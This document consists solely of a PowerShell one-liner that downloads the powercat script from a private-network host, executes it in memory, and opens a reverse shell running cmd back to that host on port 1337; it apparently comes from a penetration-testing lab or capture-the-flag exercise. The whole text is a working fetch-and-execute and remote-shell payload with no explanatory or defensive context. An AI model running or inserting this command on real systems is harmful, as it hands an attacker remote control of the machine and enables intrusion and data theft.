powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.9.0.215:3000/powercat.ps1');powercat -c 10.9.0.215 -p 1337 -e cmd"
